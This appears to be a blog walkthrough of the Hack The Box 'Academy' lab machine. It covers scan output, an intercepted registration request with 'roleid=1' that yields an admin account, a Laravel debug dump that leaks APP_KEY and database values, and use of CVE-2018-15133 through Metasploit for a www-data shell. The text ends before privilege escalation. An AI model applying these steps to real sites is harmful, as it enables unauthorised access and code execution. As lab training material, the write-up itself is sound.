@@ -1,0 +1,292 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Academy HTB | this is a tech blog</title>
+  <meta name="author" content="dmeg">
+  
+  <meta name="description" content="Academy HTB
+This is the step by step walkthrough of the Academy Machine on Hack the box . According to Machine Difficulty Rating, it is chatagorized at medium difficulty by most fellow haxors"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="Academy HTB"/>
+  <meta property="og:site_name" content="this is a tech blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">this is a tech blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class=""></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class=""></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> Academy HTB</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="Academy-HTB"><a href="#Academy-HTB" class="headerlink" title="Academy HTB"></a>Academy HTB</h1><p><img src="/images/academy11.png" alt="academy11"></p>
+<p>This is the step by step walkthrough of the <a target="_blank" rel="noopener" href="https://www.hackthebox.eu/">Academy Machine on Hack the box</a> . According to Machine Difficulty Rating, it is chatagorized at medium difficulty by most fellow haxors</p>
+<a id="more"></a>
+
+<p><img src="/images/academy12.png" alt="academy12"></p>
+<p>Will get the machine started and note the ip address</p>
+<p><img src="/images/academy1.png" alt="academy"></p>
+<p>Initial Reconnaisance results :-</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">[*] Nmap: 22&#x2F;tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">[*] Nmap: 80&#x2F;tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">[*] Nmap: 33060&#x2F;tcp open  mysqlx?</span><br><span class="line">[*] Nmap: 1 service unrecognized despite returning data. If you know the service&#x2F;version, please submit the following fingerprint at https:&#x2F;&#x2F;nmap.org&#x2F;cgi-bin&#x2F;submit.cgi?new-service :</span><br><span class="line">[*] Nmap: SF-Port33060-TCP:V&#x3D;7.91%I&#x3D;7%D&#x3D;12&#x2F;10%Time&#x3D;5FD1EA61%P&#x3D;x86_64-pc-linux-gnu%r(</span><br><span class="line">[*] Nmap: SF:NULL,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(GenericLines,9,&quot;\x05\0\0\0\x0b</span><br><span class="line">[*] Nmap: SF:\x08\x05\x1a\0&quot;)%r(GetRequest,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(HTTPO</span><br><span class="line">[*] Nmap: SF:ptions,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(RTSPRequest,9,&quot;\x05\0\0\0\x0</span><br><span class="line">[*] Nmap: SF:b\x08\x05\x1a\0&quot;)%r(RPCCheck,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(DNSVer</span><br><span class="line">[*] Nmap: SF:sionBindReqTCP,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(DNSStatusRequestTCP,</span><br><span class="line">[*] Nmap: SF:2B,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#39;\x1a\x0f</span><br><span class="line">[*] Nmap: SF:Invalid\x20message\&quot;\x05HY000&quot;)%r(Help,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;</span><br><span class="line">[*] Nmap: SF:)%r(SSLSessionReq,2B,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x0</span><br><span class="line">[*] Nmap: SF:1\x10\x88&#39;\x1a\x0fInvalid\x20message\&quot;\x05HY000&quot;)%r(TerminalServerCooki</span><br><span class="line">[*] Nmap: SF:e,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(TLSSessionReq,2B,&quot;\x05\0\0\0\x0b\</span><br><span class="line">[*] Nmap: SF:x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#39;\x1a\x0fInvalid\x20message\</span><br><span class="line">[*] Nmap: SF:&quot;\x05HY000&quot;)%r(Kerberos,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(SMBProgNeg,</span><br><span class="line">[*] Nmap: SF:9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(X11Probe,2B,&quot;\x05\0\0\0\x0b\x08\x05</span><br><span class="line">[*] Nmap: SF:\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#39;\x1a\x0fInvalid\x20message\&quot;\x05HY</span><br><span class="line">[*] Nmap: SF:000&quot;)%r(FourOhFourRequest,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(LPDString</span><br><span class="line">[*] Nmap: SF:,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(LDAPSearchReq,2B,&quot;\x05\0\0\0\x0b\x</span><br><span class="line">[*] Nmap: SF:08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#39;\x1a\x0fInvalid\x20message\&quot;</span><br><span class="line">[*] Nmap: SF:\x05HY000&quot;)%r(LDAPBindReq,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(SIPOption</span><br><span class="line">[*] Nmap: SF:s,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(LANDesk-RC,9,&quot;\x05\0\0\0\x0b\x08\</span><br><span class="line">[*] Nmap: SF:x05\x1a\0&quot;)%r(TerminalServer,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(NCP,9,</span><br><span class="line">[*] Nmap: SF:&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(NotesRPC,2B,&quot;\x05\0\0\0\x0b\x08\x05\x</span><br><span class="line">[*] Nmap: SF:1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#39;\x1a\x0fInvalid\x20message\&quot;\x05HY00</span><br><span class="line">[*] Nmap: SF:0&quot;)%r(JavaRMI,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(WMSRequest,9,&quot;\x05\0\</span><br><span class="line">[*] Nmap: SF:0\0\x0b\x08\x05\x1a\0&quot;)%r(oracle-tns,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%</span><br><span class="line">[*] Nmap: SF:r(ms-sql-s,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(afp,2B,&quot;\x05\0\0\0\x0b\x</span><br><span class="line">[*] Nmap: SF:08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#39;\x1a\x0fInvalid\x20message\&quot;</span><br><span class="line">[*] Nmap: SF:\x05HY000&quot;)%r(giop,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Ports 20, 80 running there usual services .Have an unusual port 33060 for which nmap couldnt do the service detection . Will start with the port 80 . check whats on the UI </p>
+<p><img src="/images/academy2.png" alt="academy ui"></p>
+<p>its a php web application based around learning thus the name Academy . these names are always very touche . Ran a nikto vulnerability scanner to find more about the website </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">+ Server: Apache&#x2F;2.4.41 (Ubuntu)                                                                                                                                                             </span><br><span class="line">+ The anti-clickjacking X-Frame-Options header is not present.                                                                                                                               </span><br><span class="line">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS                                                                    </span><br><span class="line">+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type                                    </span><br><span class="line">+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)                                                                                                                   </span><br><span class="line">+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.                                                                                                </span><br><span class="line">+ Cookie PHPSESSID created without the httponly flag                                                                                                                                         </span><br><span class="line">+ &#x2F;config.php: PHP Config file may contain database IDs and passwords.                                                                                                                       </span><br><span class="line">+ OSVDB-29786: &#x2F;admin.php?en_log_id&#x3D;0&amp;action&#x3D;config: EasyNews from http:&#x2F;&#x2F;www.webrc.ca version 4.3 allows remote admin access. This PHP file should be protected.                            </span><br><span class="line">+ OSVDB-29786: &#x2F;admin.php?en_log_id&#x3D;0&amp;action&#x3D;users: EasyNews from http:&#x2F;&#x2F;www.webrc.ca version 4.3 allows remote admin access. This PHP file should be protected.                             </span><br><span class="line">+ OSVDB-3092: &#x2F;admin.php: This might be interesting...                                                                                                                                       </span><br><span class="line">+ &#x2F;login.php: Admin login page&#x2F;section found.</span><br><span class="line">+ 7786 requests: 0 error(s) and 10 item(s) reported on remote host</span><br><span class="line">+ End Time:           2020-12-10 15:26:54 (GMT5.5) (442 seconds)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>NIkto discovered privileged pages on the web application . To find how the application is differentiating between privileged and unpriviliged users need a web proxy here to intercept packets going through the app .</p>
+<p>Upon analysing the packets saw an interesting field called called <em>roleid</em> while doing the register call for the new user . Just changed that from 0 to 1 . As a result the user that was created was an admin user . Now can access privileged pages </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;register.php HTTP&#x2F;1.1</span><br><span class="line">Host: academy.htb</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:78.0) Gecko&#x2F;20100101 Firefox&#x2F;78.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 67</span><br><span class="line">Origin: http:&#x2F;&#x2F;academy.htb</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http:&#x2F;&#x2F;academy.htb&#x2F;register.php</span><br><span class="line">Cookie: PHPSESSID&#x3D;s6k227pb24kmst4cc0v2o5bgj8</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">uid&#x3D;dmeg1&amp;password&#x3D;KYnCMT9ZiMFzncR&amp;confirm&#x3D;KYnCMT9ZiMFzncR&amp;roleid&#x3D;1</span><br></pre></td></tr></table></figure>
+<p>after logging into the /admin.php can see this page</p>
+<p><img src="/images/academy3.png" alt="acadmy-admin"></p>
+<p>this page tells there is a <em>dev-staging</em> page and has an outstanding issue in it . will add this in the hostfile and try opening this page to see how looks.</p>
+<p><img src="/images/academy4.png" alt="dev-staging"></p>
+<p>Due to a file permission issue laravel is able not open the log file to write and crashing. This is throwing a stak with a dump of all environment variables used in the application . its a treasure trove . will copy everything and see what can be used to exploit </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><span class="line">HTTP_HOST	</span><br><span class="line">&quot;dev-staging-01.academy.htb&quot;</span><br><span class="line">HTTP_CONNECTION	</span><br><span class="line">&quot;keep-alive&quot;</span><br><span class="line">HTTP_UPGRADE_INSECURE_REQUESTS	</span><br><span class="line">&quot;1&quot;</span><br><span class="line">HTTP_USER_AGENT	</span><br><span class="line">&quot;Mozilla&#x2F;5.0 (X11; Linux x86_64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.66 Safari&#x2F;537.36&quot;</span><br><span class="line">HTTP_ACCEPT	</span><br><span class="line">&quot;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9&quot;</span><br><span class="line">HTTP_ACCEPT_ENCODING	</span><br><span class="line">&quot;gzip, deflate&quot;</span><br><span class="line">HTTP_ACCEPT_LANGUAGE	</span><br><span class="line">&quot;en-IN,en-US;q&#x3D;0.9,en;q&#x3D;0.8&quot;</span><br><span class="line">PATH	</span><br><span class="line">&quot;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;snap&#x2F;bin&quot;</span><br><span class="line">SERVER_SIGNATURE	</span><br><span class="line">&quot;&lt;address&gt;Apache&#x2F;2.4.41 (Ubuntu) Server at dev-staging-01.academy.htb Port 80&lt;&#x2F;address&gt;&quot;</span><br><span class="line">SERVER_SOFTWARE	</span><br><span class="line">&quot;Apache&#x2F;2.4.41 (Ubuntu)&quot;</span><br><span class="line">SERVER_NAME	</span><br><span class="line">&quot;dev-staging-01.academy.htb&quot;</span><br><span class="line">SERVER_ADDR	</span><br><span class="line">&quot;10.10.10.215&quot;</span><br><span class="line">SERVER_PORT	</span><br><span class="line">&quot;80&quot;</span><br><span class="line">REMOTE_ADDR	</span><br><span class="line">&quot;10.10.14.4&quot;</span><br><span class="line">DOCUMENT_ROOT	</span><br><span class="line">&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;htb-academy-dev-01&#x2F;public&quot;</span><br><span class="line">REQUEST_SCHEME	</span><br><span class="line">&quot;http&quot;</span><br><span class="line">CONTEXT_PREFIX	</span><br><span class="line">&quot;&quot;</span><br><span class="line">CONTEXT_DOCUMENT_ROOT	</span><br><span class="line">&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;htb-academy-dev-01&#x2F;public&quot;</span><br><span class="line">SERVER_ADMIN	</span><br><span class="line">&quot;admin@htb&quot;</span><br><span class="line">SCRIPT_FILENAME	</span><br><span class="line">&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;htb-academy-dev-01&#x2F;public&#x2F;index.php&quot;</span><br><span class="line">REMOTE_PORT	</span><br><span class="line">&quot;33984&quot;</span><br><span class="line">GATEWAY_INTERFACE	</span><br><span class="line">&quot;CGI&#x2F;1.1&quot;</span><br><span class="line">SERVER_PROTOCOL	</span><br><span class="line">&quot;HTTP&#x2F;1.1&quot;</span><br><span class="line">REQUEST_METHOD	</span><br><span class="line">&quot;GET&quot;</span><br><span class="line">QUERY_STRING	</span><br><span class="line">&quot;&quot;</span><br><span class="line">REQUEST_URI	</span><br><span class="line">&quot;&#x2F;&quot;</span><br><span class="line">SCRIPT_NAME	</span><br><span class="line">&quot;&#x2F;index.php&quot;</span><br><span class="line">PHP_SELF	</span><br><span class="line">&quot;&#x2F;index.php&quot;</span><br><span class="line">REQUEST_TIME_FLOAT	</span><br><span class="line">1607595624.028</span><br><span class="line">REQUEST_TIME	</span><br><span class="line">1607595624</span><br><span class="line">APP_NAME	</span><br><span class="line">&quot;Laravel&quot;</span><br><span class="line">APP_ENV	</span><br><span class="line">&quot;local&quot;</span><br><span class="line">APP_KEY	</span><br><span class="line">&quot;base64:dBLUaMuZz7Iq06XtL&#x2F;Xnz&#x2F;90Ejq+DEEynggqubHWFj0&#x3D;&quot;</span><br><span class="line">APP_DEBUG	</span><br><span class="line">&quot;true&quot;</span><br><span class="line">APP_URL	</span><br><span class="line">&quot;http:&#x2F;&#x2F;localhost&quot;</span><br><span class="line">LOG_CHANNEL	</span><br><span class="line">&quot;stack&quot;</span><br><span class="line">DB_CONNECTION	</span><br><span class="line">&quot;mysql&quot;</span><br><span class="line">DB_HOST	</span><br><span class="line">&quot;127.0.0.1&quot;</span><br><span class="line">DB_PORT	</span><br><span class="line">&quot;3306&quot;</span><br><span class="line">DB_DATABASE	</span><br><span class="line">&quot;homestead&quot;</span><br><span class="line">DB_USERNAME	</span><br><span class="line">&quot;homestead&quot;</span><br><span class="line">DB_PASSWORD	</span><br><span class="line">&quot;secret&quot;</span><br><span class="line">BROADCAST_DRIVER	</span><br><span class="line">&quot;log&quot;</span><br><span class="line">CACHE_DRIVER	</span><br><span class="line">&quot;file&quot;</span><br><span class="line">SESSION_DRIVER	</span><br><span class="line">&quot;file&quot;</span><br><span class="line">SESSION_LIFETIME	</span><br><span class="line">&quot;120&quot;</span><br><span class="line">QUEUE_DRIVER	</span><br><span class="line">&quot;sync&quot;</span><br><span class="line">REDIS_HOST	</span><br><span class="line">&quot;127.0.0.1&quot;</span><br><span class="line">REDIS_PASSWORD	</span><br><span class="line">&quot;null&quot;</span><br><span class="line">REDIS_PORT	</span><br><span class="line">&quot;6379&quot;</span><br><span class="line">MAIL_DRIVER	</span><br><span class="line">&quot;smtp&quot;</span><br><span class="line">MAIL_HOST	</span><br><span class="line">&quot;smtp.mailtrap.io&quot;</span><br><span class="line">MAIL_PORT	</span><br><span class="line">&quot;2525&quot;</span><br><span class="line">MAIL_USERNAME	</span><br><span class="line">&quot;null&quot;</span><br><span class="line">MAIL_PASSWORD	</span><br><span class="line">&quot;null&quot;</span><br><span class="line">MAIL_ENCRYPTION	</span><br><span class="line">&quot;null&quot;</span><br><span class="line">PUSHER_APP_ID	</span><br><span class="line">&quot;&quot;</span><br><span class="line">PUSHER_APP_KEY	</span><br><span class="line">&quot;&quot;</span><br><span class="line">PUSHER_APP_SECRET	</span><br><span class="line">&quot;&quot;</span><br><span class="line">PUSHER_APP_CLUSTER	</span><br><span class="line">&quot;mt1&quot;</span><br><span class="line">MIX_PUSHER_APP_KEY	</span><br><span class="line">&quot;&quot;</span><br><span class="line">MIX_PUSHER_APP_CLUSTER	</span><br><span class="line">&quot;mt1&quot;</span><br><span class="line">Environment Variables</span><br><span class="line">APP_NAME	</span><br><span class="line">&quot;Laravel&quot;</span><br><span class="line">APP_ENV	</span><br><span class="line">&quot;local&quot;</span><br><span class="line">APP_KEY	</span><br><span class="line">&quot;base64:dBLUaMuZz7Iq06XtL&#x2F;Xnz&#x2F;90Ejq+DEEynggqubHWFj0&#x3D;&quot;</span><br><span class="line">APP_DEBUG	</span><br><span class="line">&quot;true&quot;</span><br><span class="line">APP_URL	</span><br><span class="line">&quot;http:&#x2F;&#x2F;localhost&quot;</span><br><span class="line">LOG_CHANNEL	</span><br><span class="line">&quot;stack&quot;</span><br><span class="line">DB_CONNECTION	</span><br><span class="line">&quot;mysql&quot;</span><br><span class="line">DB_HOST	</span><br><span class="line">&quot;127.0.0.1&quot;</span><br><span class="line">DB_PORT	</span><br><span class="line">&quot;3306&quot;</span><br><span class="line">DB_DATABASE	</span><br><span class="line">&quot;homestead&quot;</span><br><span class="line">DB_USERNAME	</span><br><span class="line">&quot;homestead&quot;</span><br><span class="line">DB_PASSWORD	</span><br><span class="line">&quot;secret&quot;</span><br><span class="line">BROADCAST_DRIVER	</span><br><span class="line">&quot;log&quot;</span><br><span class="line">CACHE_DRIVER	</span><br><span class="line">&quot;file&quot;</span><br><span class="line">SESSION_DRIVER	</span><br><span class="line">&quot;file&quot;</span><br><span class="line">SESSION_LIFETIME	</span><br><span class="line">&quot;120&quot;</span><br><span class="line">QUEUE_DRIVER	</span><br><span class="line">&quot;sync&quot;</span><br><span class="line">REDIS_HOST	</span><br><span class="line">&quot;127.0.0.1&quot;</span><br><span class="line">REDIS_PASSWORD	</span><br><span class="line">&quot;null&quot;</span><br><span class="line">REDIS_PORT	</span><br><span class="line">&quot;6379&quot;</span><br><span class="line">MAIL_DRIVER	</span><br><span class="line">&quot;smtp&quot;</span><br><span class="line">MAIL_HOST	</span><br><span class="line">&quot;smtp.mailtrap.io&quot;</span><br><span class="line">MAIL_PORT	</span><br><span class="line">&quot;2525&quot;</span><br><span class="line">MAIL_USERNAME	</span><br><span class="line">&quot;null&quot;</span><br><span class="line">MAIL_PASSWORD	</span><br><span class="line">&quot;null&quot;</span><br><span class="line">MAIL_ENCRYPTION	</span><br><span class="line">&quot;null&quot;</span><br><span class="line">PUSHER_APP_ID	</span><br><span class="line">&quot;&quot;</span><br><span class="line">PUSHER_APP_KEY	</span><br><span class="line">&quot;&quot;</span><br><span class="line">PUSHER_APP_SECRET	</span><br><span class="line">&quot;&quot;</span><br><span class="line">PUSHER_APP_CLUSTER	</span><br><span class="line">&quot;mt1&quot;</span><br><span class="line">MIX_PUSHER_APP_KEY	</span><br><span class="line">&quot;&quot;</span><br><span class="line">MIX_PUSHER_APP_CLUSTER	</span><br><span class="line">&quot;mt1&quot;</span><br><span class="line">Registered Handlers</span><br><span class="line">0. Whoops\Handler\PrettyPageHandler</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>taking out important shit from the dump.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">SERVER_ADMIN	</span><br><span class="line">&quot;admin@htb&quot;</span><br><span class="line">SCRIPT_FILENAME	</span><br><span class="line">&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;htb-academy-dev-01&#x2F;public&#x2F;index.php&quot;</span><br><span class="line">REMOTE_PORT	</span><br><span class="line">&quot;33984&quot;</span><br><span class="line">GATEWAY_INTERFACE	</span><br><span class="line">&quot;CGI&#x2F;1.1</span><br><span class="line">APP_KEY</span><br></pre></td></tr></table></figure>
+<p>probably the cgi server itself is running on 33984 . couldnt directly reach from browser. said connection refused . could probably use from proxying through like the web server .</p>
+<p>since the app key is there will use <a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/47129">CVE-2018-15133</a> exploit with metasploit to get a shell. </p>
+<blockquote>
+<p>In Laravel Framework through 5.5.40 and 5.6.x through 5.6.29, remote code execution might occur as a result of an unserialize call on a potentially untrusted X-XSRF-TOKEN value. This involves the decrypt method in Illuminate/Encryption/Encrypter.php and PendingBroadcast in gadgetchains/Laravel/RCE/3/chain.php in phpggc. The attacker must know the application key, which normally would never occur, but could happen if the attacker previously had privileged access or successfully accomplished a previous attack.</p>
+</blockquote>
+<p>which this case , we have .</p>
+<p><img src="/images/academy5.png" alt="user-1"></p>
+<p>got in as www-data now have to do privilege escalation</p>
